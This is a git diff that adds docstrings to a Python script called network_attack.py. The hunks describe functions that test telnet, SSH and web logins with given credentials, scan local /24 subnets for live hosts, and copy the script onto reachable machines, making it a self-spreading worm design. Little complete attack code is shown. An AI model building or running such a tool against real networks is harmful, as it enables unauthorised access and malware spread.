@@ -275,7 +275,7 @@ def connect_telnet(ip, port, username, password):
 def connect_web(ip, port, username, password):
     """
     This function check to see if a web login can be established and if so then
-    it returns true, if not then it returns false.
+    it returns true, if not then it returns false
     :param ip: The target IP address for web login
     :param port: The target port for web login
     :param username: The target username for Telnet
@@ -298,7 +298,9 @@ def connect_web(ip, port, username, password):
 def convert_file_to_list(filename):
     """
     This function will convert a given file specified by a filename to a list
-    and will then proceed to return that list.
+    and will then proceed to return that list
+    :param filename: The filename of the file that needs to be converted to a list
+    :return file_as_list: The list of the lines from the file
     """
     with open(str(filename)) as file:
         file_as_list = append_lines_from_file_to_list(file)
@@ -309,7 +311,10 @@ def cycle_through_subnet(ip_list, interface):
     """
     This function takes in a given network interface and an IP list, it will
     get the IP address of the interface and add all the address from its /24
-    subnet to the IP list and will then return the list.
+    subnet to the IP list and will then return the list
+    :param ip_list: The list of IP addresses in the subnet
+    :param interface: The interface on which each IP address is to be checked for a
+    response
     """
     interface_split = get_if_addr(interface).split(".")
     last_byte = 0
@@ -337,7 +342,12 @@ def file_error_handler():
 def file_not_exist(ip, port, username, password):
     """
     This function will check whether network_attack.py exists on a target
-    machine and how it does that is dependent on the port being passed in.
+    machine and how it does that is dependent on the port being passed in
+    :param ip: IP of the machine we're checking for a file for
+    :param port: Port on which we which to check the machine
+    :param username: Username to use as part of checking the file
+    :param password: Password being used as part of checking the file
+    :return check_over_ssh(ip, port, username, password):
     """
     if str(port) == "22":
         return check_over_ssh(ip, port, username, password)
@@ -349,6 +359,8 @@ def gathering_local_ips(ip_list):
     """
     This function will cycle through all local interfaces outside the loopback
     interface and will add their /24 subnets to the IP list.
+    :param ip_list: The IPs for which we're fetching the subnets.
+    :return ip_list: The IP list with the newly found subnet addresses.
     """
     print("Fetching local interface list...")
     local_interfaces = get_if_list()
@@ -372,7 +384,10 @@ def is_reachable_ip(ip):
     This function checks to see if an IP is reachable and returns true if it is
     and false if it isn't. The commented out code is the scapy way of doing it
     and the uncommented code uses OS calls. In my testing OS calls were faster
-    but both approaches work.
+    but both approaches work
+    :param ip: The IP address we're checking to see if it is reachable
+    :return True: If the IP address is reachable
+    :return False: If the IP address is not reachable
     """
     # ping_pkt = IP(dst=str(ip))/ICMP()
     # reply = sr(ping_pkt, timeout=1)[0]
@@ -397,7 +412,13 @@ def propagate_script(ip, port, login_string):
     either 22 (SSH) and 23 (telnet), it will also check to ensure the script
     isn't  already present on the target. It goes about propagating the script
     in different ways depending on if an SSH port or a telnet port is
-    specified.
+    specified
+    :param ip: The IP address we wish to propagate the script to
+    :param port: The port through which we'll propagate the script
+    :param login_string: This string contains the username and password for the service
+    used
+    :return True: If the script is successfully propagated here.
+    :return False: If the script is not successfully propagated here.
     """
     login_string_split = login_string.split(":")
     try:
